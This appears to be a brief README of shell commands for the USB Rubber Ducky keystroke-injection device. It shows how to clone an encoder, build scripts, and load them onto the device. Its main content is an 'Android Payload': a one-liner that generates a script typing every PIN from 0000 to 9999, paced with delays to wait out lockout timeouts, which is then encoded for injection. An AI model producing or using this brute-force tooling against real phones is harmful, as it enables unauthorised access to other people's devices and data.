# install

```
git clone https://github.com/jbarcia/ducky && cd ducky
```
```
chmod a+rx /Volumes/USB-Blanca/Hak5/RubberDucky/ducky/duckencode.jar
```
# use 
```
java -jar /Volumes/USB-Blanca/Hak5/RubberDucky/ducky/duckencode.jar -i helloworld.txt -o /Volumes/RubberDucky/inject.bin
```

# Android Payload 

```
port install gsed
```
## Create Dictionary 
``` 
echo DELAY 5000 > android_brute-force_0000-9999.txt; echo {0000..9999} | xargs -n 1 echo STRING | gsed '0~5 s/$/\nWAIT/g' | gsed '0~1 s/$/\nDELAY 1000\nENTER\nENTER/g' | gsed 's/WAIT/DELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER/g' >> android_brute-force_0000-9999.txt
```

## Copy Payload in Rubber Ducky
``` 
java -jar /Volumes/USB-Blanca/Hak5/RubberDucky/ducky/duckencode.jar -i android_brute-force_0000-9999.txt -o /Volumes/RubberDucky/inject.bin
``` 
